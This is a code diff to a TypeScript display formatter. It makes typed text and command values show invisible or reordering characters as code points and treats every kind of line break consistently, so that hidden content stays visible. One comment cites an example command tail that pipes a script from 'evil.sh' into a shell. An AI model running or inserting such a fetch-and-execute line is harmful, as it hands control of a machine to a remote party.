@@ -3,6 +3,7 @@
  * Keeps raw JSON out of the user's face.
  */
 
+import { showInvisible } from "./invisible.js";
 import { keyCaps, keyPlatformOf, type KeyPlatform } from "./keys.js";
 
 const MAX_VALUE = 120;
@@ -12,11 +13,12 @@ const MAX_FIELDS = 6;
  * A value on one line, cut to fit by its middle so its end always shows: a
  * command's last part ("; curl evil.sh | sh") is where a harmless start
  * hides what it does. A line break or tab in it is said as its key, never
- * folded into a space.
+ * folded into a space, and a character that reorders or hides text (a
+ * direction mark, a zero-width space) as its code point.
  */
 function truncate(s: string, n = MAX_VALUE): string {
-  const t = s
-    .replace(/\r?\n/g, " ⏎ ")
+  const t = showInvisible(s)
+    .replace(/\r\n|\r|\n/g, " ⏎ ")
     .replace(/\t/g, " ⇥ ")
     .replace(/[ \f\v]+/g, " ")
     .trim();
@@ -118,13 +120,14 @@ const words = (text: string): Part => ({ pieces: [{ text }], raw: undefined });
 /**
  * Typed words as a step shows them: every one, in quotes, a quote inside
  * them escaped so they cannot read as the end of the step and the start of
- * another, and a line break or tab as the key it presses.
+ * another, a line break or tab as the key it presses, and an invisible
+ * character as its code point.
  */
 function typed(v: unknown): StepLine {
   const text = typeof v === "string" ? v : fmtVal(v);
   const pieces: StepLine = [{ text: "“" }];
-  for (const part of text.split(/(\r?\n|\t)/)) {
-    if (part === "\n" || part === "\r\n") pieces.push({ key: "⏎" });
+  for (const part of showInvisible(text).split(/(\r\n|\r|\n|\t)/)) {
+    if (part === "\n" || part === "\r\n" || part === "\r") pieces.push({ key: "⏎" });
     else if (part === "\t") pieces.push({ key: "Tab" });
     else if (part) pieces.push({ text: part.replace(/[“”"\\]/g, (q) => `\\${q}`) });
   }
